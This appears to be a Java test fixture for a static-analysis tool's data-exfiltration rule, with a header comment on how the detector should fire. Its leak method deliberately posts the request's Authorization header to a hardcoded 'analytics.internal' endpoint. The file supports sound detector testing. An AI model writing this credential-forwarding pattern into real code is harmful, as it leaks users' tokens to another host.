// DATA_EXFIL fixture: Spring RestTemplate.  An HTTP header value (a
// Sensitive source) flows directly into the request body of
// `restTemplate.postForObject(url, body, type)`.  The destination URL
// is hardcoded so SSRF must NOT fire.  `Cap::DATA_EXFIL` must fire on
// the body position.  Type-qualified resolution rewrites
// `restTemplate.postForObject` → `HttpClient.postForObject` via the
// JAVA_HIERARCHY (RestTemplate subtypes HttpClient), reusing the same
// flat sink rule the JDK client uses.
//
// Driven by `data_exfil_java_integration_tests.rs`.
import javax.servlet.http.HttpServletRequest;
import org.springframework.web.client.RestTemplate;

public class DataExfilRestTemplate {
    public void leak(HttpServletRequest request) {
        String authHeader = request.getHeader("Authorization");
        RestTemplate restTemplate = new RestTemplate();
        restTemplate.postForObject(
            "https://analytics.internal/track",
            authHeader,
            String.class);
    }
}
